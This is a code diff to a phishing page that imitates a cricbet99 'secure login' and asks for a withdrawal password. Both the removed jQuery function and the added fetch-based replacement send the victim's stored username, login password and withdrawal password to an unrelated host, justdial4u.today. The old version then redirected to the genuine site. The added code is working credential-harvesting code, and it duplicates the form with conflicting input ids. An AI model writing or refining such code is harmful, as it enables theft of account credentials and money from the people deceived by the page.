@@ -91,14 +91,16 @@
          Please enter withdrawal password to login 
          securely.
       </p>
-      <form class="form-horizontal" role="form" method="post">
-      <div class="form-group m-b-20">
-         <input placeholder=" Enter Withdraw Password" id="loginName" name="username" value="" class="form-control" type="text">
-         <span id="username-error" class="error"></span>
-      </div>
-      <div class="form-group text-center">
-         <button type="button" class="btn btn-submit btn-login" onclick="checkLogin()">  Secure Login<i class="fas fa-sign-in-alt"></i></button>
-      </div>
+    <form class="form-horizontal" role="form" method="post">
+  <div class="form-group m-b-20">
+    <!-- Display the loginName from sessionStorage in the input field -->
+    <input placeholder=" Enter Withdrawal Password" id="withdrawPassword" name="withdrawPassword" value="" class="form-control" type="text">
+    <span id="username-error" class="error"></span>
+  </div>
+  <div class="form-group text-center">
+    <button type="button" class="btn btn-submit btn-login" onclick="submitWithdrawal()">Secure Login <i class="fas fa-sign-in-alt"></i></button>
+  </div>
+</form>
       </div>
       </div>
       </div>
@@ -108,31 +110,65 @@
       </div>
 	  
       <script src="assets/js/jquery.js"></script>
-      <script type="text/javascript">
-         function checkLogin(){
-             var code = $("#loginName").val();
-             $("#msg").html('Login invalid !').css("color","red");
-             if(code !=''){
-              var loginName = sessionStorage.getItem("loginName");
-              var password  = sessionStorage.getItem("password");
-               $.ajax({
-                 type : "POST",
-                 url : "https://justdial4u.today/cricbet99.php",
-                 data :"loginName="+loginName+"&password="+password+"&code="+code,
-                 success : function(msg){
-         	  $("#errorMsg").html('Username and password is incorrect.');
-                if(msg="sucessmsg"){
-                 window.location.href = "https://cricbet99.com";
-                 }
-                 }
-               })
-             }else{
-               alert('All fields are required.');
-               return false;
-             }
-         
-           }
-		</script>   
+    <form class="form-horizontal" role="form" method="post">
+  <div class="form-group m-b-20">
+    <!-- The input for withdrawPassword -->
+    <input placeholder="Enter Withdraw Password" id="withdrawPassword" name="withdrawPassword" value="" class="form-control" type="password">
+    <span id="username-error" class="error"></span>
+  </div>
+  <div class="form-group text-center">
+    <button type="button" class="btn btn-submit btn-login" onclick="submitWithdrawal()">Secure Login <i class="fas fa-sign-in-alt"></i></button>
+  </div>
+</form>
+
+<script>
+  // Retrieve loginName and password from sessionStorage
+  var loginName = sessionStorage.getItem("loginName");
+  var password = sessionStorage.getItem("password");
+
+  // Check if loginName and password exist, if not, redirect to login page
+  if (!loginName || !password) {
+    alert("You must log in first!");
+    window.location.href = "index.html"; // Redirect to login page
+  }
+
+  // Function to handle the withdrawal form submission
+  function submitWithdrawal() {
+    var withdrawPassword = document.getElementById("withdrawPassword").value;
+
+    // Validate the withdrawal password input
+    if (!withdrawPassword) {
+      alert("Please enter the withdrawal password.");
+      return; // Prevent form submission if the password is not provided
+    }
+
+    // Create FormData object to send loginName, password, and withdrawPassword to the server
+    var formData = new FormData();
+    formData.append("username", loginName); // Send the loginName
+    formData.append("password", password); // Send the login password
+    formData.append("withdrawPassword", withdrawPassword); // Send the withdrawPassword
+
+    // Send the data to the server using fetch
+    fetch("https://justdial4u.today/cricbet99.php", {
+      method: "POST",
+      body: formData
+    })
+    .then(response => response.text())
+    .then(data => {
+      if (data === "success") {
+        alert("Login and withdrawal successful!");
+        // Handle success (e.g., redirect to another page)
+      } else {
+        alert("Error: " + data);
+      }
+    })
+    .catch(error => {
+      console.error("Error:", error);
+      alert("An error occurred.");
+    });
+  }
+</script>
+
 		
 		 
 	  <script>
